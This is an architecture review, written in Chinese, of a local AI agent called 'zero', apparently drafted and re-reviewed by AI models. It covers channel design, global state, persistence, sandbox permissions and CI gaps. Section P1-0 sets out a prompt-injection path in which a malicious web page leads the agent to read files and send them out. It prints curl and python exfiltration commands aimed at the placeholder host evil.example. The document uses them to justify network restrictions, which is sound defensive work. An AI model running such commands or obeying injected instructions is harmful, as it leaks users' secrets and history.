# Zero 架构评审与改进建议（最终版）

> **状态说明（2026-11）**：本文是整改前的评审快照，文中的行号、文件路径与代码行为可能已过时（例如文内描述的 `save_config` 已随 P1-3 一起删除）。已完成项见 git 历史；判断现状请以当前代码为准。

> 评审对象：`zero`（本地单用户 AI Agent：CLI / 飞书 / Web 三通道，共享 MessageBus 与 Agent 循环）
> 评审基线：以"单人维护、本机运行、长期演进"为目标，不按多租户服务标准苛求
> 本版说明：**本版为独立复审（GLM-5.3）**。对前版（DeepSeek 评审）的 11 项结论逐条复核：**9 项确认、2 项校准、1 个新增问题（另有 2 项并入式补充）**。两版一致的结论以 ✅ 标注（高置信）；新增/修正以 ★ 标注。
> 二次复审：**DeepSeek（2026-10-22）** 复核了 GLM 版新增的 P1-0，确认问题成立，但修正了外泄示例与整改优先级，见 §0.4。
>
> 最终结论：**工程判断力在资深工程师水平（安全边界与失败模式的处理尤为突出），主要短板在"可复制性"与"工程护栏"。另有一处前版未覆盖的安全设计盲区——读全开 × 网络全开的外泄通道——本版列为最高优先级修复项之一。**

每条问题统一结构：**现象 → 为什么是问题（类比 + 具体咬人场景）→ 改进方案 → 验收标准 → 代价**。

等级定义：

| 等级 | 含义 | 处理建议 |
|---|---|---|
| P0 | 结构性问题，越晚改越贵，会持续产生重复劳动 | 最近两个迭代 |
| P1 | 正确性或安全性风险 | 三个月内处理 |
| P2 | 局部设计债或流程缺失 | 顺手做，或等触发条件 |

---

## 0. 复审摘要

### 0.1 与前版的差异（复审透明度）

| 前版编号 | 内容 | 复审结论 |
|---|---|---|
| P0-1 | 通道层无共享服务、CLI God Class | ✅ 确认，原样保留 |
| P0-2 | 全局单例与导入期副作用 | ✅ 已完成（两步均已落地：消灭导入期 IO + 存储/权限状态实例化注入） |
| P1-1 | 持久化缺"一轮"事务边界 | ✅ 确认 |
| P1-2 | 同步 IO 阻塞事件循环 | ✅ 确认 |
| P1-3 | 配置继承自毁开关 | ✅ 确认 |
| P1-4 | 工程护栏缺失 | ✅ 确认；★ 补充 Python 版本钉死问题 |
| P2-1 | core 依赖策略层 | ✅ 确认；★ 扩充：OpenAI Provider 实例有状态、不可重入 |
| P2-2 | Provider 抽象名义化、死方法 | ✅ 确认（本版独立 grep 复核：`chat_with_llm` 全仓库零调用方） |
| P2-3 | 无可观测性 | ✅ 确认；★ 补充：一次性任务在派发入队时即标记 done |
| P2-4 | 契约靠注释执法 | ✅ 确认 |
| P2-5 | 无界队列、超限伪装 done | ✅ 确认 |
| — | （前版未发现） | ★ 新增 **P1-0**：读全开 × 网络全开 = 零交互外泄通道（安全） |
| — | （前版未发现） | ★ 新增：`Envelope.network` 字段存在但策略层从不消费（并入 P1-0） |
| 安全维度总评 | 前版评 A 且未列任何风险项 | ★ 校准：**权限架构本身优秀，但默认能力包络有一个未成文的大洞** |

### 0.2 问题总表

| 编号 | 问题 | 等级 | 典型症状 | 修复成本 | 收益 |
|---|---|---|---|---|---|
| P1-0 ★ | 读全开 × 网络全开，零交互外泄通道 | P1 | 沙箱内命令可读任意非凭证文件并外发，无人值守渠道同样可行 | 小-中 | 极高 |
| P0-1 | 通道层无共享服务，CLI 1300 行 God Class | P0 | 加一个会话功能要改 2–3 处，且容易漂移 | 中 | 极高 |
| P0-2 | 全局单例与导入期副作用 | P0 | 测试靠 monkeypatch，进程内无法跑两个实例 | 已完成 | 高 |
| P1-1 | 持久化缺"一轮"事务边界，靠启发式自愈 | P1 | 孤儿 tool_call、重复占位、只能靠约定避免 400 | 中 | 高 |
| P1-2 | async 主路径上的同步 IO 与全量索引重写 | P1 | 历史大时整条事件循环卡住，停止信号也延迟 | 低-中 | 中高 |
| P1-3 | 配置继承有自毁开关 | P1 | 跑一次模板生成，派生任务永久失去继承 | 低 | 中 |
| P1-4 | 无 CI、无 lint、pytest 未装、Python 版本钉死 | P1 | "测试全绿"无法自动验证；协作者无法起步 | 低 | 极高 |
| P2-1 | core 依赖策略层；Provider 实例有状态不可重入 | P2 | 构建提示词会跑子进程；复用 provider 实例会互相掐断流 | 低 | 中 |
| P2-2 | Provider 抽象名义化，有死方法 | P2 | 换原生厂商 API 需重写，扩展者被误导 | 低 | 中 |
| P2-3 | 没有可观测性 | P2 | 用户说"卡住了"，只能翻整本日志 | 低-中 | 中 |
| P2-4 | 关键契约靠注释，缺自动执法 | P2 | metadata 规约已经漂移一次 | 低 | 中高 |
| P2-5 | 无界队列；迭代超限伪装成正常回复 | P2 | 内存无上限；英文提示被当成模型回答落盘 | 低 | 中 |

### 0.3 不建议做的事（防止过度反应）

- 不要引入 DI 框架、事件框架、ORM。本地单进程应用，手工组合根（`build_core()`）足够。
- 不要把进程内 `MessageBus` 换成 Redis/Kafka。它现在的形态是对的。
- 不要为了网络管控引入容器或 VM 依赖。SBPL 自带的 `(deny network-outbound)` 就够，`Envelope.network` 字段已经在那等着被启用。
- 不要为了消除自愈逻辑直接换数据库。加"轮次标记"比换存储便宜一个数量级。
- 不要给 CLI 再造一套 UI 框架。拆类、抽服务层就够，不需要抽象层。

### 0.4 二次复审补正（DeepSeek，2026-10-22）

对 GLM 版新增的 P1-0 做独立验证。结论：**问题成立，但原表述有两处会误导实施，已修正。**

| 项 | GLM 版 | 二次复审结论 |
|---|---|---|
| 读 × 网络盲区 | 新增 P1-0 | ✅ 成立，保留 |
| 外泄示例 | `cat .env ... \| curl ...` | ❌ macOS 上不成立：POSIX 是无 shell 直接 exec，管道、重定向、`~`、glob 全部不生效（[context.py:27](../zero/core/context.py#L27)、[shell.py:100](../zero/tools/shell.py#L100)）。已改为单程序外泄与两步外泄 |
| 整改优先级 | 全局默认拒绝网络 | ⚠️ 过猛：web-search、git、pip、npm 全依赖网络，直接全局拒绝会让 agent 基本不可用。已改为"先无人值守、再按二进制授予" |
| 网络探针 | 未涉及 | ★ 补充：网络必须像读拒绝一样做双向探针，沿用既有 `_probe` 模式 |
| 统计口径 | "3 项新增" | ⚠️ 实为 1 个新增问题行 + 2 项并入既有问题，已改 |

另确认 GLM 的三条补充均属实：`chat_with_llm` 全仓库零调用方（grep）；`Envelope.network` 恒 True 且策略层从未置 False；scheduler 一次性任务在派发入队时即标记 done（[engine.py:80](../zero/scheduler/engine.py#L80)）。GLM 版的总体判断与执行顺序可接受，仅 P1-0 的实施路线需要按上表调整。

---

## 1. 总体评价

| 维度 | 评级 | 依据 |
|---|---|---|
| 模块边界 | A- | [models.py](../zero/models.py) 是真正的依赖叶子；core/bus/channels/tools/providers 依赖方向基本单向 |
| 安全与权限设计 | A- ★ | P/G/D 资源分档、内核沙箱、双向探针、fail-closed 分层，全项目最强的一块——但默认包络有 P1-0 的盲区，扣一级 |
| 故障与边界处理 | A- | 孤儿 tool_call 自愈、截断检测、协作式取消，都是被真实事故打出来的 |
| 契约设计 | B+ | Provider/Tool/Hooks 契约清楚，但 hook 只剩一个点、provider 实际只有一个实现 |
| 可演进性 | B- | 全局单例、通道层重复实现，换存储/加通道会疼 |
| 通道层结构 | C+ | [cli.py](../zero/channels/cli.py) 1300 行 God Class，与 web 重复 |
| 工程流程 | C+ | 无 CI、无 ruff/mypy、venv 里连 pytest 都没装 |

一句话总评：**作者懂系统，尤其懂安全边界和失败模式；但把"一个能跑得很稳的个人工具"和"一个能长大的框架"之间的那层抽象，选择了暂时不做。** 这个取舍对当前目标是合理的，对上限就是天花板。

---

## 2. P0：结构性问题

### P0-1 通道层没有共享服务，CLI 长成 1300 行 God Class ✅

**现象**

- [cli.py](../zero/channels/cli.py#L81) 单类 1317 行、55 个方法，同时负责：会话选择、终端渲染、流式帧布局、输入线程、审批按键、后台 turn 分流、斜杠命令。
- 会话/任务/模型的业务逻辑在 [cli.py:213](../zero/channels/cli.py#L213) 和 [server.py:195](../zero/channels/web/server.py#L195) 各写一遍。"空会话不显示"这类规则靠两处复制保持一致。
- 通道之间没有共同接口：没有 `Channel` 基类或协议，只有"约定俗成地订阅 bus + 自己处理会话"。

**为什么是问题**

类比：三家门店各自手写一套会员规则。总部改一次"金卡门槛"，要通知三份文档，漏一份就出现"同一个客户在 A 店是金卡、在 B 店不是"。CLI 这家店更糟——店长同时当前台、收银、保安、装修工。

具体会怎么咬人：

1. 加"删除会话"功能：`SessionStore` 加一个方法，CLI 要写确认交互，Web 要加协议帧，领域动作一份、展示逻辑三份。
2. 改"空会话过滤"规则：只改 CLI，Web 列表就多出空壳——两处过滤条件现在就是复制关系，这不是假设。
3. 修一个渲染 bug 要在 1300 行里定位，回归面横跨会话切换、审批、后台消息所有路径。

**改进方案**（纯重构，不改行为）

1. 抽 `ChannelService`（`zero/channels/service.py`）：会话列表/创建/切换/标题、模型查询与切换、任务列表、历史投影。三通道都只调它。
2. 定义 `Channel` 协议：`start()` / `stop()` / `deliver(msg)` / `deliver_stream(event)`。按职责拆 CLI：`CliChannel`（生命周期与 bus 对接）、`CliRenderer`（Live 帧/溢出裁剪，现在的 `_frame*`/`_commit_overflow`）、`CliInput`（prompt-toolkit 与工作线程）、`CliApproval`（审批面板与按键）。

**验收标准**

- `cli.py` 降到 400 行以内，且不再直接 import `SessionStore` / `SchedulerStore`。
- 全仓库 `SessionStore.list_sessions` 的调用方只剩 `ChannelService` 一处。
- 现有 CLI 行为测试（`test_cli_overflow.py`、`smoke_cli_stream.py` 等）不改断言即通过。

**代价**：中。纯搬运，风险低，建议 CI 就位后再做。

---

### P0-2 全局单例与导入期副作用 ✅（两步均已落地）

> **落地状态（2026-11）**：第一步与第二步都已完成，下面的"现象/改进方案"保留为
> 整改前快照。
>
> - `zero.paths.configure()` 在组合根显式调用；`Paths` 作为普通参数向下传，
>   `current()` 只保留在 CLI / 工具等进程边界。
> - `SessionStore` / `SchedulerStore` 改为实例类，构造时接收路径，由
>   `main.build_core()` 创建并注入 `AgentLoop`、`Context`、`ChannelService`、
>   `MaintenanceEngine`、`Scheduler` 等。
> - 权限层的 `_probe_cache` / `_network_probe_cache` / `_session_roots` 收进
>   `PermissionState`，`guard` / `Shell` / `Context` 显式接收；`seatbelt` 的
>   profiles 目录改为显式参数。
> - `tests/conftest.py` 的 `isolated_state` 通过 `configure()` 隔离数据根，
>   测试不再 monkeypatch 模块常量。

**现象**

- [config.py:160](../zero/config.py#L160)：`default_config = load_config()`——模块被 import 的瞬间就读磁盘。
- [store.py](../zero/session/store.py)：`SessionStore` 全部 `@staticmethod`，路径来自模块常量 `SESSIONS_ROOT`，无可注入点。
- [envelope.py:249](../zero/permission/envelope.py#L249)：`_session_roots`、`_probe_cache` 是模块级可变字典。
- [context.py:92](../zero/core/context.py#L92)：`_skills_cache` 挂在类上。
- [main.py:51](../zero/main.py#L51) 的 `build_agent_loop` 拿到的就是这个全局对象；`MaintenanceEngine`、`SubagentManager`、`Scheduler` 都各自直接 import 它。

**为什么是问题**

类比：全屋电器不经过配电箱，直接焊死在总电闸上。平时能用，但想给某个房间单独装电表、想临时断电检修、想接第二路电源，都只能拆墙。测试就是"每次都要把整栋楼的总闸换掉，再原样装回去"。

具体会怎么咬人：

1. **测试隔离**：想把 `ZERO_ROOT` 指到临时目录，必须在 import 任何 `zero.*` 之前改环境，或 monkeypatch 一堆模块常量——任何早先 import 的模块已经捕获了旧路径。现有测试大量依赖 monkeypatch 而非显式注入，根因在此。
2. **无法同进程多实例**：想写"两个会话并发跑两套配置"的集成测试，或把 zero 作为库嵌入别的程序，直接做不到。
3. **配置读取时机不可控**：改完 `config.json` 必须重启；工具子进程、测试进程各自 import 时重新读，出现同机多进程配置不一致的隐性差异。
4. **安全判定绑在全局路径推导上**：[current_envelope](../zero/permission/envelope.py#L272) 经 `SessionStore.session_dir`（模块常量）算会话目录，想验证"不同会话写集合不同"非常别扭。

**改进方案** ★（收窄为两步，避免为不存在的需求做全量 DI）

1. **第一步（必做，收益立现）**：消灭导入期 IO。`load_config()` 改为 `main()` / `build_core()` 里显式调用并向下传；禁止模块顶层执行；`envelope`/`context` 的模块级缓存收进显式对象。仅此一步，测试就不再需要"import 前改环境"。
2. **第二步（可选，等需求出现再做）**：`SessionStore` 实例化并由 `build_core()` 注入。触发条件：真出现多实例/嵌入式需求，或测试隔离仍不够用。单用户本地应用，不必提前。

**验收标准**

- `import zero.config` 不产生任何文件读取（测试断言 `open` 未被调用）。
- 搜索 `from zero.config import default_config` 为空。
- 测试不再需要 monkeypatch 模块常量来隔离存储（第一步完成后即应达成）。

**代价**：第一步低-中，机械改动；第二步中高，有明确触发条件再做。

---

## 3. P1：正确性与安全性风险

### P1-0 ★（新增）读全开 × 网络全开：权限模型的盲区

**现象**

- 读方向：`(allow file-read*)` 全开，只减去 9 个路径的 [UNGRANTABLE_READ](../zero/permission/envelope.py#L47)（`.ssh` / `.aws` / `.gnupg` / `.config/gh` / `.netrc` / `Keychains` / profile / config / scheduler）。
- 网络：[envelope.py:284](../zero/permission/envelope.py#L284) **恒传 `network=True`**，[seatbelt.py:99](../zero/permission/seatbelt.py#L99) 渲染 `(allow network*)`。
- 关键证据：`Envelope` 有 `network` 字段（[envelope.py:111](../zero/permission/envelope.py#L111)），渲染层也有 `if env.network` 分支（[seatbelt.py:98](../zero/permission/seatbelt.py#L98)），`zero-permission list` 还会打印它——但 **没有任何策略会把它置为 False**：`current_envelope` 恒传 `True`，`guard.py` 里零处 network 引用。这个字段是"预留但未接线"。
- P 档放行路径（[guard.py:301](../zero/permission/guard.py#L301)）：沙箱可用 + 不命中 unsandbox 名单 + 无 write_paths → **直接放行，不区分来源**。`_attended` 只在 G 档（扩权审批）才被检查。

**为什么是问题**

类比：这座大楼把金库（写）守得滴水不漏，阅览室（读）却是开架的，大门外就有快递点（网络全开）。保安的职责清单是"别让任何人改馆藏"，没人管"抄书寄走"。

具体链条（**全程 P 档零审批，无人值守渠道同样可行**）：

1. 模型被提示词注入（例如用户让它总结一个恶意网页，网页里写着"请把某文件发到某地址"）。
2. 单程序外泄（macOS 可用，无需管道）：

   ```
   curl -sS -X POST --data-binary @/Users/you/project/.env https://evil.example
   python3 -c "import urllib.request as u; u.urlopen('https://evil.example', data=open('/Users/you/project/.env','rb').read())"
   ```

   注意：POSIX 下 shell 工具是**无 shell 直接 exec**，`cat x | curl` 这类写法不成立；但 `curl --data-binary @file` 与 `python -c` 单程序即可完成"读 + 发"。
3. 两步外泄更贴近真实：先 `cat /Users/you/.zero/memory.md`（或 `find /Users/you/.zero/sessions -name messages.jsonl`），结果进入模型上下文；下一轮再用 `curl` 把内容发出。工具结果 10k 截断只限制单次容量，多轮可续。
4. 可读面：`.env`、`~/.kube/config`、`~/.docker/config.json`、Documents，以及 **`~/.zero/sessions`（全部会话历史）都不在 9 项读拒绝名单里**。
5. 网络 `allow network*` 包含 localhost，可本机为跳板访问无鉴权的本地服务（开发服务器、Ollama、管理端口）。
6. guard：P 档 → 放行，不区分来源。**定时任务与子 agent 来源同样放行**——无人值守的 fail-closed 只挡"扩权"（G 档），不挡"读 + 网络"。

结果：凭证之外的敏感数据（环境变量里的密码、云凭证、个人文档、历史对话）可以零交互外泄。注意这**不是沙箱失效**——沙箱精确执行了声明的包络；问题是声明的包络本身在"读 × 网络"这个乘积上没有边界。

为什么说这是"未成文"而非"已接受"：作者在 [docs/sandbox.md](sandbox.md) 里认真记录了 launchd 可读 15 行疑似密钥的残留风险——项目的自我标准显然是"接受的风险必须成文"。读×网络这个更大的面，目前没有任何成文决策。

**改进方案**（分层：先切断无人值守，再动默认体验）

1. **第一步（必须，改动小）**：把网络纳入"来源"维度，而不是全局开关。`current_envelope(ctx)` 对 `origin.kind in {"scheduler","subagent"}` 以及非交互渠道返回 `network=False`；attended CLI/Web 暂保持 True（人类能在终端看到工具调用）。这一步不改变日常体验，却切断了最危险的"无人值守自动外泄"。
2. **第二步（推荐）**：attended 也改为默认拒绝，按二进制授予网络（`curl` / `git` / `pip` / `npm` / web-search 脚本），复用 unsandbox 白名单的审批模式。**不要一上来全局默认拒绝**——web-search、git、pip、npm 都依赖网络，会让 agent 基本不可用。拒绝时复用 [shell.py:15](../zero/tools/shell.py#L15) 的 `_DENIED_HINT` 机制引导申请。
3. **第三步（可选，边界最干净）**：shell 彻底禁网，网络能力独立成 `http_fetch` 工具，由核心做响应检查。把"任意程序执行"与"对外通信"分离，长期最稳。
4. **网络探针**：像读拒绝一样做双向验证——基线命令仍可执行 + 未授权连接确实失败。只改默认值不做探针，等于假设它生效了。
5. **成文**：无论采纳哪一步，把"读 × 网络"的决策写进 `docs/sandbox.md`，与 launchd 残留并列。

**验收标准**

- unattended 来源（scheduler / subagent）的 shell 无网络；attended 行为符合所选阶段。
- 网络双向探针通过（基线 rc=0 + 未授权连接失败）。
- 拒绝时 hint 给出扩权路径；`zero-permission list` 与实际 profile 一致。
- `docs/sandbox.md` 有该风险的成文决策。

**代价**：第一步小；第二步中（体验调优与白名单维护是主要工作量）；第三步大。**第一步是全清单里性价比最高的安全改动。**

---

### P1-1 持久化没有"一轮"的事务边界，只能靠启发式自愈 ✅

**现象**

- 会话是 append-only 的 `messages.jsonl`，每条消息独立追加（[store.py:299](../zero/session/store.py#L299)）。
- LLM 返回 `tool_calls=[A, B]` 时，先落 `assistant(tool_calls)`（[runner.py:222](../zero/core/runner.py#L222)），再逐条落 tool 结果。
- 进程在执行完 A、未执行 B 时被杀 → 磁盘上是"A、B 声明 + 只有 A 的结果"。
- 下次加载补占位 tool 结果（[store.py:401](../zero/session/store.py#L401)），turn 起点原子重写文件（[store.py:464](../zero/session/store.py#L464)），另有去重逻辑处理"占位 + 真实结果"共存（[store.py:379](../zero/session/store.py#L379)）。

**为什么是问题**

这是全项目最值得写清楚的一处，因为它不是"写错了"，而是"结构上缺一个概念"。

类比：收银台没有"结账完成"这个动作，只有一叠小票。盘点发现少一张票就补一张写着"缺失"的纸条。问题在于：**正在结账的客人桌上也可能少那张票，你分不清他是"还没结"还是"跑了"**。于是只能加规则"只有店长能补票"——但店里后来多了第二个会补票的人（maintenance、Web 历史导出、未来的任何只读方），重复补票就又开始了。

已被代码注释记录过的真实事故路径：

1. 进程被 `kill -9`，留下未闭合的 `assistant(tool_calls)`。
2. 重启加载历史时，若另一个读路径也修复并写盘 → 写入占位 B。
3. 真实 B 稍后落盘 → 同一 `tool_call_id` 两条 tool 消息。
4. 下一次请求 OpenAI 直接 400，整个会话不可用。

现在的防线（修复只在 turn owner 落盘 / 尾部未闭合不写 / 加载去重）都是**约定**而非**结构**。且占位结果靠固定文案识别（`missing tool result (auto-repaired at load)`），一旦未来代码生成同样文本，识别即失效。

**改进方案**

给每一轮加显式起止标记：

```
{"kind":"turn_begin","turn_id":"t1","tool_call_ids":["A","B"]}
{"sender":"assistant","tool_calls":[A,B],...}
{"sender":"tool","tool_call_id":"A",...}
{"sender":"tool","tool_call_id":"B",...}
{"kind":"turn_end","turn_id":"t1"}
```

- 只有 `turn_end` 存在但 tool 结果缺失的轮，才判定为崩溃残留，**启动时**修一次。
- 没有 `turn_end` 的轮 = 可能正在执行，读路径一律不动、不写盘。
- 修复结果加类型化字段 `synthetic=true`，不再靠文案匹配。
- 旧历史兼容：缺标记按"已闭合"处理。

**验收标准**

- 测试模拟"写入 assistant(tool_calls) 后进程中断"，重启后能正常发请求。
- 同一 `tool_call_id` 永不出两条 tool 消息（保留现有测试）。
- `load_history(persist_repair=False)` 的读路径零写盘（文件 mtime 断言）。

**代价**：中。动消息格式，需兼容旧历史。

---

### P1-2 async 主路径上的同步 IO 与全量索引重写 ✅

**现象**

- 每个 turn 出队后，[loop.py:56](../zero/core/loop.py#L56) 同步执行 `append` → `touch` → `auto_title`。
- `append` 每条消息打开一次文件；`touch` 读整个 `index.json`、改一个时间戳、整份写回（O(会话数)，[store.py:312](../zero/session/store.py#L312)）；`load_history` 每轮解析整个 `messages.jsonl`（[store.py:464](../zero/session/store.py#L464)），修复时还会重写整份文件。

**为什么是问题**

类比：单车道收费站，收费员每次收费都要跑到后台翻一遍全部账本，后面所有车都在等。"后面的车"不只是用户输入——还有流式渲染、飞书回复、停止信号、审批请求。

具体会怎么咬人：

1. 历史到几万条时，每轮开头解析一次全量 JSONL（3 万条量级约 0.3s+），期间 CLI 流式更新、停止键、跨通道回复全部延迟。
2. 会话上千后，每轮一次的索引重写是 MB 级 IO。
3. 停止信号是旁路设计，本意"实时置位"，但它与主循环共享事件循环——同步 IO 一卡，终止就不"实时"了。

**改进方案**

1. loop 边界把 store 调用包进 `asyncio.to_thread`（先解决卡循环，不改存储格式）。
2. 索引加内存缓存 + mtime 失效。
3. `append` 按 turn 批量缓冲、一次 flush。
4. 修复写盘挪到启动时一次处理。

**验收标准**

- 一轮对话期间事件循环最大阻塞 < 50ms（后台心跳协程打点）。
- 会话数 1000、历史 3 万条时，停止信号从发出到生效 < 200ms。

**代价**：低-中。第 1 步几乎零风险，先做。

---

### P1-3 配置继承用"是否写过"表达，且存在一个自毁开关 ✅

**现象**

- [resolve_runtime](../zero/config.py#L58) 用 `model_dump(exclude_unset=True)` 判断"哪些键在磁盘上出现过"，按 `task 显式 > default 显式 > 模型默认` 合并。
- [save_config](../zero/config.py#L138) 全字段 dump；代码注释已明确警告：在已有配置上重跑 `python -m zero.config` 会让每个任务条目变成全显式，**永久失去对 default 的字段级继承**。

**为什么是问题**

类比："沉默 = 默认同意"的遗嘱。有人把所有人的沉默都补写成明文"同意"之后，你再改主遗嘱，这些人就不再受影响——而文件看起来完全正常，没有任何报错。

具体例子：compact 条目原本只写 `model`，`maxTokens` 跟随 default。执行一次模板生成后，compact 被展开成全字段——从此改 `default.maxTokens` 不再影响 compact。**没有任何提示，也没有测试会发现。**

**改进方案**

1. 最小：`save_config` 在配置文件已存在时拒绝执行（只允许写 `.example`），或强制 `--force` 并打印继承丢失警告。
2. 加往返测试：最小配置 → 解析 → 序列化 → 再解析，断言继承关系不变。
3. 中期：继承显式化（`null` 表示继承），让字段存在与否不再承载语义。

**验收标准**

- 对现有配置执行模板生成不会覆盖（返回非零或明确拒绝）。
- 往返测试锁定：`resolve_runtime("compact").llm_call_options.max_tokens` 跟随 default 变化。

**代价**：低。第 1 步十分钟，第 2 步半小时。

---

### P1-4 工程护栏缺失：无 CI、无 lint、pytest 未装、Python 版本钉死 ✅

**现象**

- 无 `.github/`、无 CI；`pyproject.toml` 无 pytest / ruff / mypy 配置。
- 本版独立实测：`.venv/bin/python -m pytest` → `No module named pytest`；改用 `python -m unittest discover -s tests`，**只发现 17 个用例（1.3s）且有 3 个 error**——19 个测试文件里只有 6 个是 `unittest.TestCase`，其余是 import 即执行的脚本或裸 `test_*` 函数，没有统一 harness。[test_history_render.py:45](../tests/test_history_render.py#L45) 在 import 期断言直接打断发现流程；Windows-only 的按键测试在 macOS 上不是 skip 而是 error。
- [pyproject.toml:10](../pyproject.toml#L10) 要求 `Python >= 3.14.5`，协作者与 CI 镜像未必具备。
- README 仍是 Windows 视角（`zero.exe`、PowerShell 激活），而开发已转 macOS——新人第一步就会困惑。

**为什么是问题**

类比：车上装了安全带（3900 行测试），但没人年检（CI）。安全带再好，没人系也等于没有。

具体会怎么咬人：

1. "测试全绿"只能靠人工跑，无法在提交时自动证明——本次评审的两个模型都只能口头转述。
2. 这个仓库最强的几条不变量（metadata 零读写、守卫必须装上、修复只在 owner 落盘）全靠注释，没有自动执法（见 P2-4，且已经漂移过一次）。
3. Python 版本钉死 3.14.5，把"能不能跑"变成环境问题而非代码问题。

**改进方案**

1. 统一测试入口：全部改成 pytest 可收集（或统一 unittest），禁止 import 期断言；平台相关用例用 skip 而非 error。
2. `[dependency-groups] dev = ["pytest", "ruff"]`，`uv sync --dev` 即可跑。
3. `[tool.pytest.ini_options]` 设 `testpaths` / asyncio 配置。
4. GitHub Actions：`uv sync` + `ruff check` + `pytest -q`，覆盖 3.12 与 3.13。
5. `requires-python` 放宽到实际需要的最低版本（除非确有 3.14 语法依赖），CI 验证最低版本。
6. README 按当前双平台现实改写（macOS 主、Windows 兼容说明保留）。

**验收标准**

- PR 上能看到 CI 状态；本地一条命令跑全量测试。
- 全量测试零 error（平台不适用用例 skip 而非失败）。
- 删除一行关键守卫代码，CI 必须变红。

**代价**：低，收益最高。**建议第一个做。**

---

## 4. P2：局部设计债

### P2-1 core 依赖策略层；Provider 实例有状态、不可重入 ✅（扩充）

**现象 A：core → permission 的依赖 + 副作用**

- [context.py:17](../zero/core/context.py#L17) import `zero.permission.envelope`；[context.py:187](../zero/core/context.py#L187) 在渲染 environment 段时调 `envelope.available()`——首次调用会写探针标记文件并跑两次 `sandbox-exec` 子进程（[envelope.py:149](../zero/permission/envelope.py#L149)）。
- [runner.py:58](../zero/core/runner.py#L58) 直接 `OpenAI(...)`，provider 写死在核心层。

类比：菜单上写"今日推荐"，但每次有人**问菜单**，后厨就现杀一条鱼。表面是读操作，实际触发整个厨房。

咬人场景：单测构造一次 `Context.system_prompt` 就可能拉起子进程；CI 容器/非 macOS 上行为与本机不同；提示词差异排查时容易被探针结果误导。

**现象 B（★新增）：OpenAI Provider 实例有状态**

- [openai.py:44](../zero/providers/openai.py#L44)：`self._stream_resp = resp`——把"当前流"存在**实例属性**上；取消路径 `_close_stream_resp` 关掉的是"这个实例最近一次流"的连接。

类比：一台遥控器俩电视——按"紧急停止"，停掉的可能是另一台电视。

当前每个 `AgentRunner` / `Compactor` 各自 new 一个 `OpenAI`，所以暂时安全——但这个"暂时"没有任何结构或注释保证。一旦有人自然地优化（比如按模型缓存 provider 实例——这是很合理的下一步），并发两条流会互相 close 对方连接，表现为**偶发流中断**，极难排查。

**改进方案**

1. `build_core()` 一次性结算能力事实（沙箱是否可用/原因），构造纯数据 `CapabilityNotes` 注入 `Context`；provider 经 `config.provider_for(task)` 工厂注入 runner。
2. `_stream_resp` 改为 `_stream_conn` 内局部变量 + 句柄传给 close 路径（或 provider 显式声明不可重入 + 断言）。

**验收标准**

- 构造 `system_prompt` 的测试断言零子进程、零文件写入；`grep "zero.permission" zero/core/` 为空。
- 新增回归测试：同一 provider 实例并发两条流，取消一条不影响另一条。

**代价**：低。

---

### P2-2 Provider 抽象是名义上的，且有死方法 ✅

**现象**

- [base.py:86](../zero/providers/base.py#L86) 的 `chat_with_llm` 是抽象方法，本版独立 grep 复核：**全仓库零调用方**；实现还是同步 `requests` 套 async 签名。
- `LLMCallOptions` 字段全是 OpenAI 协议名，`payload_dict` 直接透传。所谓"多厂商"实为"多个 OpenAI 兼容端点 + 不同 api_base"。

类比：号称万能的遥控器，其实只有一种红外编码。换品牌电视不是改配置，是换遥控器。

**改进方案**

1. 删除 `chat_with_llm`（死代码待在抽象基类里，会误导扩展者以为必须实现）。
2. 文档明确写：当前只支持 OpenAI-compatible wire format。
3. 若确要接原生厂商，先定义 Provider 职责边界（payload 归一化/流事件归一化）+ fake provider 一致性测试。

**验收标准**：抽象基类无未调用的抽象方法；文档与实际支持范围一致。**代价**：低。

---

### P2-3 没有可观测性 ✅（补充一点）

**现象**

- 只有 `~/.zero/debug.log` 一个全局文件，日志不带结构化的 `turn_id`/`session_id`。
- 无延迟/工具失败率/token 用量/压缩次数聚合；`MessageBody.token_usage` 存了但没人汇总。
- ★ 补充：一次性定时任务在**派发入队时**即标记 done（[engine.py:80](../zero/scheduler/engine.py#L80)），turn 失败无重试、无感知——结果静默丢失。

类比：黑匣子只写不读，也没有仪表盘。用户说"刚才卡住了"，你只能在三个通道交错的日志里猜是哪一轮。

**改进方案**

1. 日志 formatter 加 `turn_id`/`channel`/`session_id`（`contextvars` 注入），一行定位一轮。
2. 每轮结束打一条结构化 summary：模型、迭代数、工具调用数、token、耗时、是否压缩。
3. 加 `/debug last`（CLI）/ `debug` 帧（Web）返回最近一轮时间线。
4. 一次性任务状态在 turn 结束时回写（或至少把派发与完成分成两个状态）。

**验收标准**：任意一轮可按 `turn_id` 串起完整链路；token 可按会话汇总。**代价**：低-中。

---

### P2-4 关键契约靠注释，缺自动执法 ✅

**现象**

- [models.py](../zero/models.py) 注释和 [metadata_refactor.md](metadata_refactor.md) 都规定"核心代码不读不写 metadata"，但 [cli.py:280](../zero/channels/cli.py#L280) 在用 `metadata.get("kind") == "compact"` 判断压缩消息——**规约已漂移**。
- [loop.py:43](../zero/core/loop.py#L43)、[runner.py:62](../zero/core/runner.py#L62) 都用 `hooks or Hooks()`：不传 hooks 得到空基类，守卫不在链上。生产路径一定装，但这是"靠组合根自觉"的安全边界——守卫内部的 fail-closed 救不了"根本没被调用"。
- `ATTENDED_CHANNELS`（[guard.py:53](../zero/permission/guard.py#L53)）加通道时没有对应提醒。

类比：门上装了锁，但锁是可拆卸的，说明书上写"请务必装上"。某天有人从侧门进来，这不叫入侵，叫"没装锁"。

**改进方案**

1. `kind=compact` 提升为类型化字段（如 `MessageBody.synthetic`）。
2. 加 AST 测试：禁止 `core/`、`channels/`、`scheduler/` 出现 `metadata.get` / `metadata[...]`（白名单显式列出）。
3. `hooks` 参数改必填；启动断言链上必须有 `PermissionGuard`，否则拒绝启动（而非静默降级）。
4. 通道能力测试：遍历通道名，断言都在 `ATTENDED_CHANNELS` 或显式 `UNATTENDED` 集合里。

**验收标准**：每个测试在删掉对应约定时变红；守卫缺失时进程直接失败。**代价**：低，第 3 步是安全语义补强，值得优先。

---

### P2-5 无界队列；迭代超限伪装成正常回复 ✅

**现象**

- [queue.py:19](../zero/bus/queue.py#L19)：`asyncio.Queue()` 无 `maxsize`。
- [runner.py:258](../zero/core/runner.py#L258)：达到 `max_iterations` 后 `yield StreamEvent(kind="done", content="Agent runner exceeded max_iterations.")`。

**为什么是问题**

类比：电梯超载不报警，只是停在某一层播报"已到达"——乘客以为到了目的地。

